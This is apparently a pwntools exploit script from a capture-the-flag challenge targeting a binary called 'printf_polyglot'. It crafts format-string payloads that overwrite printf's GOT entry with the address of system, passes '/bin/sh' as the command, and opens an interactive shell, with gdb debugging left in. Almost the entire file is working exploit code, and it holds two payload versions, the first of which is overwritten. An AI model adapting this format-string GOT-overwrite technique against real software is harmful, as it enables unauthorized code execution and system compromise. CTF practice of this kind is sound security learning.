from pwn import *

elf = ELF('./printf_polyglot')

#io = remote('p1.tjctf.org', 8003)

io = process('./printf_polyglot')

gdbscript = """
    break *newsletter+104
    continue
"""

context.terminal = ['tmux', 'split', '-h']
gdb.attach(io, gdbscript)

io.sendline('3')


command = '/bin/sh ||'
padd = 'Z' * 0

printf_got = elf.got['printf']
system_addr = 0x4006E0 + 14




print hex(printf_got)


payload = command + padd + p64(printf_got) + p64(printf_got + 2) + 16 * 'a' +  '%{}.x'.format(0x91 - len(command + padd + p64(printf_got) * 2 + 16 * 'a')) + '%27$hhn' + ''   +'%{}.x'.format(0x400a - 0x91) + '%28$hn'


payload = command + padd + '%{}x.'.format(system_addr - len(command + padd) + 1220 - 1849) + '%lx.' * 50 + '%lln' + p64(printf_got) + '\x00'
print 0x91 - len(command + padd + p64(printf_got) * 2 + 16 * 'a')



#payload = '%7$llx.%28$llx'


#payload = '%x'

print len(payload)
print payload
io.sendline(payload)


io.recv()


io.interactive()
